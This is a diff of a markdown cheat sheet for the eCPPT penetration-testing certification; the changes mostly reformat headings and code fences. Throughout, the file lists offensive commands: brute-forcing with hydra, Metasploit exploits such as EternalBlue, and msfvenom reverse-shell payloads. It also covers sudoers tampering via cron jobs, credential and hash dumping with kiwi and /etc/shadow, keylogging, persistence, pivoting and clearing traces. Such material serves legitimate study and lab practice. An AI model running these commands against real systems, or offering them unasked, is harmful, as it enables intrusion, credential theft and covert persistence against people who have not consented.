@@ -1,10 +1,14 @@
 # 📔 eCPPT Cheat Sheet
 
-## Networking
+### Networking
 
-#### Routing
 
-```bash
+
+**Routing**
+
+
+
+```
 # Linux
 ip route
 
@@ -15,9 +19,11 @@ route print
 netstat -r
 ```
 
-#### IP
+**IP**
 
-```bash
+
+
+```
 # Linux
 ip a
 ip -br -c a
@@ -29,9 +35,11 @@ ipconfig /all
 ifconfig
 ```
 
-#### ARP
+**ARP**
 
-```bash
+
+
+```
 # Linux
 ip neighbour
 
@@ -42,9 +50,11 @@ arp -a
 arp
 ```
 
-#### Ports
+**Ports**
 
-```bash
+
+
+```
 # Linux
 netstat -tunp
 netstat -tulpn
@@ -58,9 +68,11 @@ netstat -p tcp -p udp
 lsof -n -i4TCP -i4UDP
 ```
 
-#### Connect and Scan
+**Connect and Scan**
 
-```bash
+
+
+```
 nc -v example.com 80
 
 openssl s_client -connect <HOST>:<PORT>
@@ -72,11 +84,15 @@ openssl s_client -connect <HOST>:<PORT> -quiet
 nc -zv <HOST> <PORT>
 ```
 
-## Information Gathering
+### Information Gathering
 
-#### Passive
 
-```bash
+
+**Passive**
+
+
+
+```
 host <HOST>
 whatweb <HOST>
 whois <HOST>
@@ -92,9 +108,11 @@ theHarvester -d <HOST>
 theHarvester -d <HOST> -b all
 ```
 
-#### Google Dorks
+**Google Dorks**
 
-```bash
+
+
+```
 site:
 inurl:
 site:*.sitename.com
@@ -107,9 +125,11 @@ inurl:passwd.txt
 inurl:wp-config.bak
 ```
 
-#### DNS
+**DNS**
 
-```bash
+
+
+```
 sudo nano /etc/hosts
 dnsenum <HOST>
 # e.g. dnsenum zonetransfer.me
@@ -120,9 +140,11 @@ dig axfr @DNS-server-name <HOST>
 fierce --domain <HOST>
 ```
 
-#### Host Discovery
+**Host Discovery**
 
-```bash
+
+
+```
 ## Ping scan
 sudo nmap -sn <TARGET_IP/NETWORK>
 ## ARP scan
@@ -169,11 +191,15 @@ nmap -Pn -sV -sC -O -oA outputfile <TARGET_IP>
 nmap -A -oA outputfile <TARGET_IP>
 ```
 
-## Footprinting & Scanning
+### Footprinting & Scanning
 
-#### Network Discovery
 
-```bash
+
+**Network Discovery**
+
+
+
+```
 sudo arp-scan -I eth1 <TARGET_IP/NETWORK>
 ping <TARGET_IP>
 sudo nmap -sn <TARGET_IP/NETWORK>
@@ -187,13 +213,19 @@ fping -I eth1 -g <TARGET_IP/NETWORK> -a
 fping -I eth1 -g <TARGET_IP/NETWORK> -a fping -I eth1 -g <TARGET_IP/NETWORK> -a 2>/dev/null
 ```
 
-## Enumeration
+### Enumeration
 
-### SMB
 
-#### Nmap
 
-```bash
+#### SMB
+
+
+
+**Nmap**
+
+
+
+```
 sudo nmap -p 445 -sV -sC -O <TARGET_IP>
 nmap -sU --top-ports 25 --open <TARGET_IP>
 
@@ -223,14 +255,18 @@ nmap -p 445 --script smb-os-discovery <TARGET_IP>
 nmap -p445 --script=smb-vuln-* <TARGET_IP>
 ```
 
-#### Nmblookup
+**Nmblookup**
 
-<pre class="language-bash"><code class="lang-bash"><strong>nmblookup -A &#x3C;TARGET_IP>
+
+
+<pre><code><strong>nmblookup -A &#x3C;TARGET_IP>
 </strong></code></pre>
 
-#### SMBMap
+**SMBMap**
 
-```bash
+
+
+```
 smbmap -u guest -p "" -d . -H <TARGET_IP>
 
 smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP>
@@ -247,9 +283,11 @@ smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/sample_backdoor' 'C$\s
 smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
 ```
 
-#### SMB Connection
+**SMB Connection**
 
-```bash
+
+
+```
 # Connection
 smbclient -L <TARGET_IP> -N
 smbclient -L <TARGET_IP> -U <USER>
@@ -263,9 +301,11 @@ ls
 get <filename>
 ```
 
-#### RPCClient
+**RPCClient**
 
-```bash
+
+
+```
 rpcclient -U "" -N <TARGET_IP>
 ## RPCCLIENT
 enumdomusers
@@ -273,9 +313,11 @@ enumdomgroups
 lookupnames admin
 ```
 
-#### Enum4Linux
+**Enum4Linux**
 
-```bash
+
+
+```
 enum4linux -o <TARGET_IP>
 enum4linux -U <TARGET_IP>
 enum4linux -S <TARGET_IP>
@@ -299,9 +341,11 @@ smbclient \\\\<TARGET_IP>\\c$ -N -U ""
 smb: \> get file_shared.txt
 ```
 
-#### Hydra
+**Hydra**
 
-```bash
+
+
+```
 gzip -d /usr/share/wordlists/rockyou.txt.gz
 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb
@@ -309,9 +353,11 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb
 
 We can use a wordlist generator tools (how [Cewl](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/cewl)), to create custom wordlists.
 
-#### Metasploit
+**Metasploit**
 
-```bash
+
+
+```
 # METASPLOIT Starting
 msfconsole
 msfconsole -q
@@ -330,11 +376,15 @@ set RHOSTS <TARGET_IP>
 exploit
 ```
 
-### FTP
+#### FTP
 
-#### Nmap
 
-```bash
+
+**Nmap**
+
+
+
+```
 sudo nmap -p 21 -sV -sC -O <TARGET_IP>
 nmap -p 21 -sV -O <TARGET_IP>
 
@@ -342,9 +392,11 @@ nmap -p 21 --script ftp-anon <TARGET_IP>
 nmap -p 21 --script ftp-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
 ```
 
-#### Ftp Client
+**Ftp Client**
 
-```bash
+
+
+```
 ftp <TARGET_IP>
 ls
 cd /../..
@@ -352,17 +404,23 @@ get <filename>
 put <filename>
 ```
 
-#### Hydra
+**Hydra**
 
-```bash
+
+
+```
 hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> -t 4 ftp
 ```
 
-### SSH
+#### SSH
 
-#### Nmap
 
-```bash
+
+**Nmap**
+
+
+
+```
 # NMAP
 sudo nmap -p 22 -sV -sC -O <TARGET_IP>
 
@@ -375,30 +433,38 @@ nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, s
 nmap -p 22 --script=ssh-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
 ```
 
-#### Netcat
+**Netcat**
 
-```bash
+
+
+```
 # NETCAT
 nc <TARGET_IP> <TARGET_PORT>
 nc <TARGET_IP> 22
 ```
 
-#### SSH
+**SSH**
 
-```bash
+
+
+```
 ssh <USER>@<TARGET_IP> 22
 ssh root@<TARGET_IP> 22
 ```
 
-#### Hydra
+**Hydra**
 
-```bash
+
+
+```
 hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh
 ```
 
-#### Metasploit
+**Metasploit**
 
-```bash
+
+
+```
 use auxiliary/scanner/ssh/ssh_login
 
 set RHOSTS <TARGET_IP>
@@ -408,11 +474,15 @@ set VERBOSE true
 exploit
 ```
 
-### HTTP
+#### HTTP
 
-#### Nmap
 
-```bash
+
+**Nmap**
+
+
+
+```
 sudo nmap -p 80 -sV -O <TARGET_IP>
 
 nmap -p 80 --script=http-enum -sV <TARGET_IP>
@@ -421,9 +491,11 @@ nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ <T
 nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ <TARGET_IP>
 ```
 
-#### Alternative
+**Alternative**
 
-```bash
+
+
+```
 whatweb <TARGET_IP>
 http <TARGET_IP>
 browsh --startup-url http://<TARGET_IP>
@@ -444,9 +516,11 @@ curl --digest -u <USER>:<PW> http://<TARGET_IP>/<DIR>
 lynx <TARGET_IP>
 ```
 
-#### Metasploit
+**Metasploit**
 
-```bash
+
+
+```
 use auxiliary/scanner/http/brute_dirs
 use auxiliary/scanner/http/robots_txt
 use auxiliary/scanner/http/http_header
@@ -468,11 +542,15 @@ set AUTH_URI /<DIR>/
 exploit
 ```
 
-### SQL
+#### SQL
 
-#### Nmap
 
-```bash
+
+**Nmap**
+
+
+
+```
 sudo nmap -p 3306 -sV -O <TARGET_IP>
 
 nmap -p 3306 --script=mysql-empty-password <TARGET_IP>
@@ -507,7 +585,7 @@ nmap -p 3306 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mss
 nmap -p 3306 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" <TARGET_IP>
 ```
 
-```bash
+```
 # MYSQL
 mysql -h <TARGET_IP> -u <USER>
 mysql -h <TARGET_IP> -u root
@@ -520,15 +598,19 @@ select count(*) from <TABLE_NAME>;
 select load_file("/etc/shadow");
 ```
 
-#### Hydra
+**Hydra**
 
-```bash
+
+
+```
 hydra -l <USER> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> mysql
 ```
 
-#### Metasploit
+**Metasploit**
 
-```bash
+
+
+```
 use auxiliary/scanner/mysql/mysql_schemadump
 use auxiliary/scanner/mysql/mysql_writable_dirs
 use auxiliary/scanner/mysql/mysql_file_enum
@@ -566,17 +648,21 @@ set CMD whoami
 exploit
 ```
 
-### SMTP
+#### SMTP
 
-#### Nmap
 
-```bash
+
+**Nmap**
+
+
+
+```
 sudo nmap -p 25 -sV -sC -O <TARGET_IP>
 
 nmap -sV -script banner <TARGET_IP>
 ```
 
-```bash
+```
 nc <TARGET_IP> 25
 telnet <TARGET_IP> 25
 
@@ -585,13 +671,15 @@ HELO attacker.xyz
 EHLO attacker.xyz
 ```
 
-```bash
+```
 smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <TARGET_IP>
 ```
 
-#### Metasploit
+**Metasploit**
 
-```bash
+
+
+```
 # METASPLOIT
 service postgresql start && msfconsole -q
 
@@ -602,9 +690,11 @@ setg RHOST <TARGET_IP>
 use auxiliary/scanner/smtp/smtp_enum
 ```
 
-## Vulnerability Assessment
+### Vulnerability Assessment
 
-```bash
+
+
+```
 # HEARTBLEED
 nmap -sV --script ssl-enum-ciphers -p <SECURED_PORT> <TARGET>
 nmap -sV --script ssl-heartbleed -p 443 <TARGET_IP>
@@ -620,17 +710,23 @@ use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
 nmap --script log4shell.nse --script-args log4shell.callback-server=<CALLBACK_SERVER_IP>:1389 -p 8080 <TARGET_IP>
 ```
 
-```bash
+```
 searchsploit badblue 2.7
 ```
 
-## Host Based Attacks
+### Host Based Attacks
 
-### Windows Exploitation
 
-#### IIS WEBDAV
 
-```bash
+#### Windows Exploitation
+
+
+
+**IIS WEBDAV**
+
+
+
+```
 # IIS WEBDAV
 davtest -url <URL>
 davtest -auth <USER>:<PW> -url http://<TARGET_IP>/webdav
@@ -640,17 +736,17 @@ cadaver [OPTIONS] <URL>
 nmap -p 80 --script http-enum -sV <TARGET_IP>
 ```
 
-```bash
+```
 msfvenom -p <PAYLOAD> LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f <file_type> > shell.asp
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f asp > shell.asp
 ```
 
-```bash
+```
 hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt <TARGET_IP> http-get /webdav/
 ```
 
-```bash
+```
 ## METASPLOIT
 # Global set
 setg RHOSTS <TARGET_IP>
@@ -668,19 +764,25 @@ set HttpPassword <PW>
 set PATH /webdav/metasploit.asp
 ```
 
-### SMB
+#### SMB
 
-#### Nmap
 
-```bash
+
+**Nmap**
+
+
+
+```
 nmap -p 445 -sV -sC <TARGET_IP>
 
 nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
 ```
 
-#### Metasploit
+**Metasploit**
 
-```bash
+
+
+```
 # Global set
 setg RHOSTS <TARGET_IP>
 setg RHOST <TARGET_IP>
@@ -697,11 +799,11 @@ set SMBUser <USER>
 set SMBPass <PW>
 ```
 
-```bash
+```
 psexec.py <USER>@<TARGET_IP> cmd.exe
 ```
 
-```bash
+```
 ## Manual Exploit - AutoBlue
 cd
 mkdir tools
@@ -723,14 +825,16 @@ chmod +x eternalblue_exploit7.py
 python eternalblue_exploit7.py <TARGET_IP> shellcode/sc_x64.bin
 ```
 
-#### RDP
+**RDP**
 
-```bash
+
+
+```
 # RDP
 nmap -sV <TARGET_IP>
 ```
 
-```bash
+```
 ## METASPLOIT
 # Global set
 setg RHOSTS <TARGET_IP>
@@ -749,19 +853,21 @@ set target <NUMBER>
 set GROOMSIZE 50
 ```
 
-```bash
+```
 hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<TARGET_IP> -s <PORT>
 ```
 
-```bash
+```
 xfreerdp /u:<USER> /p:<PW> /v:<TARGET_IP>:<PORT>
 
 xfreerdp /u:<USER> /p:<PW> /v:<TARGET_IP>:<PORT> /w:1920 /h:1080 /fonts /smart-sizing
 ```
 
-#### WINRM
+**WINRM**
 
-```bash
+
+
+```
 # WINRM
 crackmapexec [OPTIONS]
 evil-winrm -i <IP> -u <USER> -p <PASSWORD>
@@ -770,19 +876,19 @@ nmap --top-ports 7000 <TARGET_IP>
 nmap -sV -p 5985 <TARGET_IP>
 ```
 
-```bash
+```
 crackmapexec winrm <TARGET_IP> -u <USER> -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 
 crackmapexec winrm <TARGET_IP> -u <USER> -p <PW> -x "whoami"
 crackmapexec winrm <TARGET_IP> -u <USER> -p <PW> -x "systeminfo"
 ```
 
-```bash
+```
 # Command Shell
 evil-winrm.rb -u <USER> -p '<PW>' -i <TARGET_IP>
 ```
 
-```bash
+```
 ## METASPLOIT
 # Global set
 setg RHOSTS <TARGET_IP>
@@ -795,11 +901,15 @@ set PASSWORD <PW>
 set FORCE_VBS true
 ```
 
-### Windows Privilege Escalation
+#### Windows Privilege Escalation
 
-#### Kernel
 
-```bash
+
+**Kernel**
+
+
+
+```
 # WIN KERNEL
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe -o payload.exe
 
@@ -807,7 +917,7 @@ python3 -m http.server
 # Download payload.exe on target
 ```
 
-```bash
+```
 ## Windows-Exploit-Suggester Install
 mkdir Windows-Exploit-Suggester
 cd Windows-Exploit-Suggester
@@ -823,7 +933,7 @@ pip install xlrd --upgrade
 ./windows-exploit-suggester.py --database YYYY-MM-DD-mssb.xlsx --systeminfo win2008r2-systeminfo.txt
 ```
 
-```bash
+```
 ## METASPLOIT
 ## Global set
 setg RHOSTS <TARGET_IP>
@@ -854,9 +964,11 @@ exploit/windows/local/ms15_051_client_copy_image
 exploit/windows/local/ms16_014_wmi_recv_notif
 ```
 
-#### UAC
+**UAC**
 
-```bash
+
+
+```
 # UAC - UACME
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe > backdoor.exe
@@ -888,9 +1000,11 @@ migrate <lsass_PID>
 hashdump
 ```
 
-#### Access Token
+**Access Token**
 
-```bash
+
+
+```
 # ACCESS TOKEN IMPERSONATION
 
 ## METASPLOIT - Meterpreter (Unprivileged session)
@@ -911,9 +1025,11 @@ list_tokens -u
 impersonate_token "NT AUTHORITY\SYSTEM"
 ```
 
-### Windows Credential Dumping
+#### Windows Credential Dumping
 
-```bash
+
+
+```
 # Exploitation
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<TARGET_IP> LPORT=1234 -f exe > payload.exe
 
@@ -970,20 +1086,24 @@ set SMBPass <ADMINISTRATOR_LM:NTLM_HASH>
 exploit
 ```
 
-```bash
+```
 crackmapexec smb <TARGET_IP> -u Administrator -H "<NTLM_HASH>" -x "whoami"
 ```
 
-### Linux Exploitation
+#### Linux Exploitation
 
-#### Shellshock
 
-```bash
+
+**Shellshock**
+
+
+
+```
 # BASH - APACHE
 nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <TARGET_IP>
 ```
 
-```bash
+```
 ## METASPLOIT
 # Global set
 setg RHOSTS <TARGET_IP>
@@ -995,9 +1115,11 @@ set TARGETURI /gettime.cgi
 exploit
 ```
 
-#### FTP
+**FTP**
 
-```bash
+
+
+```
 # FTP
 ftp <TARGET_IP>
 
@@ -1005,13 +1127,15 @@ ls -lah /usr/share/nmap/scripts | grep ftp-*
 searchsploit ProFTPD
 ```
 
-```bash
+```
 hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> -t 4 ftp
 ```
 
-#### SSH
+**SSH**
 
-```bash
+
+
+```
 # SSH
 ssh <USER>@<TARGET_IP>
 
@@ -1022,13 +1146,15 @@ cat /etc/passwd
 find / -name "flag"
 ```
 
-```bash
+```
 hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt <TARGET_IP> -t 4 ssh
 ```
 
-#### SAMBA
+**SAMBA**
 
-```bash
+
+
+```
 # SAMBA
 smbmap -u <USER> -p '<PW>' -H <TARGET_IP>
 
@@ -1038,15 +1164,19 @@ enum4linux -a <TARGET_IP>
 enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>
 ```
 
-```bash
+```
 hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> smb
 ```
 
-### Linux Privilege Escalation
+#### Linux Privilege Escalation
 
-#### Kernel
 
-```bash
+
+**Kernel**
+
+
+
+```
 # LINUX KERNEL
 ## Linux-Exploit-Suggester Install
 wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O linux-exploit-suggester.sh
@@ -1056,9 +1186,11 @@ chmod +x linux-exploit-suggester.sh
 ./linux-exploit-suggester.sh
 ```
 
-#### Cron Jobs
+**Cron Jobs**
 
-```bash
+
+
+```
 # CRON
 crontab -l
 
@@ -1067,9 +1199,11 @@ find / -name <CRONJOB_SCRIPT>
 printf '#!/bin/bash\necho "<USER> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/<CRONJOB_SCRIPT>
 ```
 
-#### SUID
+**SUID**
 
-```bash
+
+
+```
 # SUID
 file <FILE>
 strings <FILE>
@@ -1079,9 +1213,11 @@ cp /bin/bash <BINARY>
 ./<FILE>
 ```
 
-### Linux Credential Dumping
+#### Linux Credential Dumping
 
-```bash
+
+
+```
 cat /etc/passwd
 sudo cat /etc/shadow
 
@@ -1093,11 +1229,15 @@ use auxiliary/analyze/crack_linux
 set SHA512 true
 ```
 
-## Network Based Attacks
+### Network Based Attacks
 
-### Wireshark
 
-```bash
+
+#### Wireshark
+
+
+
+```
 wireshark -i eth1
 
 # Filter by ip
@@ -1122,9 +1262,11 @@ tcp.flags.syn == 1 and tcp.flags.ack ==0
 eth.dst == ff:ff:ff:ff:ff:ff
 ```
 
-### TShark
+#### TShark
 
-```bash
+
+
+```
 tshark -D
 tshark -i eth1
 tshark -r <FILE>.pcap
@@ -1181,7 +1323,7 @@ tshark -r <FILE>.pcap -Y "wlan.ssid==<SSID>" -Tfields -e wlan_radio.channel
 tshark -r <FILE>.pcap -Y "wlan.ta==<DEVICE_MAC> && http" -Tfields -e http.user_agent
 ```
 
-```bash
+```
 # ARP POISONING - arpspoof
 
 ## Forward IP packets
@@ -1190,9 +1332,11 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 arpspoof -i eth1 -t <TARGET_IP> -r <HOST_IP>
 ```
 
-## Metasploit
+### Metasploit
 
-```bash
+
+
+```
 # MSF Install
 sudo apt update && sudo apt install metasploit-framework -y
 sudo systemctl enable postgresql
@@ -1203,11 +1347,11 @@ ls /usr/share/metasploit-framework
 ls ~/.msf4/modules
 ```
 
-```bash
+```
 service postgresql start && msfconsole -q
 ```
 
-```bash
+```
 # msfconsole
 db_status
 help
@@ -1251,7 +1395,7 @@ workspace <WORKSPACE_NAME>
 workspace -d <WORKSPACE_NAME>
 ```
 
-```bash
+```
 # Payload Options
 search eternalblue
 use 0
@@ -1263,9 +1407,11 @@ run
 exploit
 ```
 
-### Meterpreter
+#### Meterpreter
 
-```bash
+
+
+```
 # meterpreter > <command>
 
 background    #Switch from a Meterpreter session to the msfconsole command line 
@@ -1296,9 +1442,11 @@ sysinfo   #information about the victm Machine
 upload /****/exploit.exe C://Windows     #Upload from your machine to victm machine   
 ```
 
-### Info Gathering & Enumeration
+#### Info Gathering & Enumeration
 
-```bash
+
+
+```
 workspace -a <hostname_enum>
 # NMAP Export in .XML
 nmap -Pn -sV -O <TARGET_IP> -oX <XML_FILE_NAME>
@@ -1317,7 +1465,7 @@ notes
 db_nmap -Pn -sV -O <TARGET_IP>
 ```
 
-```bash
+```
 # Port Scan example
 workspace -a Port_scan
 search portscan
@@ -1342,7 +1490,7 @@ set RHOSTS <TARGET2_IP>
 run
 ```
 
-```bash
+```
 # UDP Scan
 search udp_sweep
 use auxiliary/scanner/discovery/udp_sweep
@@ -1350,7 +1498,7 @@ set RHOSTS <TARGET_IP>
 run
 ```
 
-```bash
+```
 # Service Enumeration
 
 # FTP
@@ -1396,9 +1544,11 @@ use auxiliary/scanner/smtp/smtp_enum
 use auxiliary/scanner/smtp/smtp_version
 ```
 
-### Vulnerability Scanning
+#### Vulnerability Scanning
 
-```bash
+
+
+```
 # NMAP
 db_nmap -sS -sV -O <TARGET_IP>
 
@@ -1410,12 +1560,12 @@ search eternalblue
 use auxiliary/scanner/smb/smb_ms17_010
 ```
 
-```bash
+```
 # Kali Linux terminal
 searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"
 ```
 
-```bash
+```
 # Metasploit Autopwn
 wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
 sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
@@ -1429,13 +1579,13 @@ db_autopwn -p -t
 db_autopwn -p -t -PI 445
 ```
 
-```bash
+```
 # msfconsole
 analyze
 vulns
 ```
 
-```bash
+```
 # NESSUS Results Import
 db_import /home/kali/Downloads/MS3_zph3t5.nessus
 hosts
@@ -1450,7 +1600,7 @@ search cve:2015 name:ManageEngine
 search PHP CGI Argument Injection
 ```
 
-```bash
+```
 # WMAP in msfconsole
 load wmap
 wmap_sites -a <TARGET_IP>
@@ -1466,11 +1616,15 @@ wmap_vulns -l
 use auxiliary/scanner/http/http_put
 ```
 
-### Payloads
+#### Payloads
 
-#### MSFVenom shells
 
-```bash
+
+**MSFVenom shells**
+
+
+
+```
 msfvenom --list payloads
 msfvenom --list formats
 msfvenom --list encoders
@@ -1507,9 +1661,11 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.p
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 ```
 
-#### **MSF Staged and Non Staged Payload**
+**MSF Staged and Non Staged Payload**
 
-```bash
+
+
+```
 # MSF STAGED Payload
 windows/x64/meterpreter/reverse_tcp
 
@@ -1517,7 +1673,7 @@ windows/x64/meterpreter/reverse_tcp
 windows/x64/meterpreter_reverse_https
 ```
 
-```bash
+```
 # Upload the payload on the target and try it with MSFconsole
 cd Payloads
 sudo python -m http.server 8080
@@ -1530,7 +1686,7 @@ set LPORT <MSFVENOM_LOCAL_PORT>
 run
 ```
 
-```bash
+```
 # Automation
 ls -lah /usr/share/metasploit-framework/scripts/resource
 
@@ -1553,15 +1709,19 @@ resource handler.rc
 makerc <FILE>.rc
 ```
 
-### Win Exploitation
+#### Win Exploitation
 
-#### Default MSF Start
 
-```bash
+
+**Default MSF Start**
+
+
+
+```
 service postgresql start && msfconsole -q
 ```
 
-```bash
+```
 db_status
 setg RHOSTS <TARGET_IP>
 setg RHOST <TARGET_IP>
@@ -1572,26 +1732,32 @@ db_nmap -sS -sV -O <TARGET_IP>
 # For every exploit, check 'options' and 'info', setup accordingly
 ```
 
-#### HFS
+**HFS**
 
-```bash
+
+
+```
 # HFS
 search type:exploit name:rejetto
 use exploit/windows/http/rejetto_hfs_exec
 ```
 
-#### SMB
+**SMB**
 
-```bash
+
+
+```
 # SMB
 search type:auxiliary EternalBlue
 use auxiliary/scanner/smb/smb_ms17_010
 use exploit/windows/smb/ms17_010_eternalblue
 ```
 
-#### WINRM
+**WINRM**
 
-```bash
+
+
+```
 # WinRM
 search type:auxiliary winrm
 use auxiliary/scanner/winrm/winrm_auth_methods
@@ -1616,9 +1782,11 @@ set PASSWORD <PW>
 set FORCE_VBS true
 ```
 
-#### TOMCAT
+**TOMCAT**
 
-```bash
+
+
+```
 # APACHE TOMCAT
 search type:exploit tomcat_jsp
 use exploit/multi/http/tomcat_jsp_upload_bypass
@@ -1629,11 +1797,15 @@ set SHELL cmd
 run
 ```
 
-### Linux Exploitation
+#### Linux Exploitation
 
-#### FTP
 
-```bash
+
+**FTP**
+
+
+
+```
 # FTP
 search vsftpd
 use exploit/unix/ftp/vsftpd_234_backdoor
@@ -1641,9 +1813,11 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 /bin/bash -i
 ```
 
-#### SAMBA
+**SAMBA**
 
-```bash
+
+
+```
 # SAMBA
 search type:exploit name:samba
 use exploit/linux/samba/is_known_pipename
@@ -1651,9 +1825,11 @@ use exploit/linux/samba/is_known_pipename
 # After exploit, proceed with Shell To Meterpreter if necessary
 ```
 
-#### SSH
+**SSH**
 
-```bash
+
+
+```
 # SSH
 search libssh_auth_bypass
 use auxiliary/scanner/ssh/libssh_auth_bypass
@@ -1665,16 +1841,18 @@ sessions 1
 # After exploit, proceed with Shell To Meterpreter if necessary
 ```
 
-```bash
+```
 # Some shell enumeration
 id
 cat /etc/*release
 uname -r
 ```
 
-#### SMTP
+**SMTP**
 
-```bash
+
+
+```
 # SMTP
 search libssh_auth_bypass
 use exploit/linux/smtp/haraka
@@ -1687,9 +1865,11 @@ run
 # This is a NON-staged payload
 ```
 
-### Post-Exploitation Fundamentals
+#### Post-Exploitation Fundamentals
 
-```bash
+
+
+```
 # METERPRETER
 run post/windows/manage/migrate
 migrate <pid> #more quickly
@@ -1697,7 +1877,7 @@ migrate <pid> #more quickly
 portfwd add -l <LOCAL_PORT> -p <TARGET_PORT> -r <TARGET_IP>
 ```
 
-```bash
+```
 # Manual SHELL TO METERPRETER
 background # or CTRL+Z
 sessions
@@ -1715,11 +1895,15 @@ sessions -u 1
 sessions 3
 ```
 
-### Win Post-Exploitation
+#### Win Post-Exploitation
 
-#### **To search for files and Folders**
 
-<pre class="language-bash"><code class="lang-bash">dir /b/s "\*.conf\*"
+
+**To search for files and Folders**
+
+
+
+<pre><code>dir /b/s "\*.conf\*"
 dir /b/s "\*.txt\*"
 dir /b/s "\*filename\*"
 cd         #it's the same as 'pwd' command in linux
@@ -1733,9 +1917,11 @@ List drives on the machine
 <strong>fsutil fsinfo drives     #Check Drives
 </strong></code></pre>
 
-#### HTTP/HFS
+**HTTP/HFS**
 
-```bash
+
+
+```
 # Meterpreter
 sysinfo
 getuid
@@ -1763,9 +1949,11 @@ set SESSION 1
 loot
 ```
 
-#### UAC
+**UAC**
 
-```bash
+
+
+```
 # Meterpreter
 shell
 
@@ -1786,9 +1974,11 @@ getsystem
 hashdump
 ```
 
-#### TOKEN IMPERSONATION
+**TOKEN IMPERSONATION**
 
-```bash
+
+
+```
 # Privilege Escalation - Meterpreter
 getuid
 getprivs
@@ -1802,9 +1992,11 @@ migrate <PID>
 hashdump
 ```
 
-#### DUMP HASHES
+**DUMP HASHES**
 
-```bash
+
+
+```
 # Kiwi - Meterpreter
 load kiwi
 creds_all
@@ -1825,7 +2017,7 @@ lsadump::secrets
 sekurlsa::logonPasswords
 ```
 
-```bash
+```
 # PASS THE HASH - PSExec
 hashdump
 exit
@@ -1836,9 +2028,11 @@ set SMBUser Administrator
 set SMBPass <ADMINISTRATOR_LM:NTLM_HASH>
 ```
 
-#### PERSISTENCE
+**PERSISTENCE**
 
-```bash
+
+
+```
 # Administrative Privileges required!
 
 # RDP - Meterpreter
@@ -1860,23 +2054,27 @@ sessions
 set SESSION 1
 ```
 
-```bash
+```
 # KEYLOGGING - Meterpreter
 keyscan_start
 keyscan_dump
 keyscan_stop
 ```
 
-#### CLEARING
+**CLEARING**
 
-```bash
+
+
+```
 # Meterpreter
 clearenv
 ```
 
-#### PIVOTING
+**PIVOTING**
 
-```bash
+
+
+```
 # Meterpreter
 run autoroute -s <TARGET1_SUBNET_NETWORK>
 
@@ -1897,9 +2095,11 @@ set LPORT <LOCAL_PORT2>
 run
 ```
 
-### Linux Post-Exploitation
+#### Linux Post-Exploitation
 
-```bash
+
+
+```
 # Meterpreter - 'root' user
 shell
 
@@ -1935,7 +2135,7 @@ set SESSION 1
 loot
 ```
 
-```bash
+```
 # PRIVILEGE ESCALATION - chkrootkit
 ps aux
 use exploit/unix/local/chkrootkit
@@ -1944,7 +2144,7 @@ set SESSION 1
 set LHOST <LOCAL_IP>
 ```
 
-```bash
+```
 # Dumping Hashes
 use post/linux/gather/hashdump
 use post/multi/gather/ssh_creds
@@ -1954,7 +2154,7 @@ use post/linux/gather/pptpd_chap_secrets
 set SESSION 1
 ```
 
-```bash
+```
 # PERSISTENCE
 # Meterpreter - Manual
 shell
@@ -1984,9 +2184,11 @@ chmod 0400 ssh_key
 ssh -i ssh_key root@<TARGET_IP>
 ```
 
-### Armitage
+#### Armitage
 
-```bash
+
+
+```
 # Armitage Kali Linux - Install
 sudo apt install armitage -y
 sudo msfdb init
@@ -1997,11 +2199,15 @@ sudo systemctl restart postgresql
